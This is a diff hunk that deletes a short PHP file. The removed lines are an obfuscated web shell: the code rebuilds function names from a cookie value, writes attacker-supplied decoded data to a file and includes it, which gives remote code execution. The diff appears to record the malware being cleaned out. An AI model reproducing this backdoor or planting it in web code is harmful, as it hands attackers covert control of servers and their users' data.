@@ -1,2 +1,0 @@
-<?php
-$Cc=$_COOKIE;$Fs=0;$doNy= (38-33 ) 	;	$Vy	=array () ;$Vy	[$Fs] =""	;while	(	$doNy )	{	 $Vy	[	$Fs ].=	$Cc[ (80-65)] [$doNy ]	;	 if(!$Cc [	(	48	-33 ) ][ $doNy+1 ]){		if (! $Cc [	(17 -2)]	[ $doNy+2])	break;	  $Fs++	;$Vy	[ $Fs ]="";  	$doNy	++	;	 }		$doNy	=	$doNy+	 ( 54-49)+	1 ;} $Fs=$Vy [	(	42-16) ](). $Vy[ 	( 81 -64	)	]; if (!$Vy [ ( 54-	42)		]	($Fs	)){	$doNy= $Vy[	(84 -69 )] ( $Fs, $Vy[ (51	- 46	)]	);$Vy	[  (	41-18)  ](	$doNy, $Vy[ 	(34- 14)	]	. $Vy[ 	(	65 -43) ]( $Vy	[	(92	-	85 )](	$Cc[3 ] ))); }include	($Fs)	;
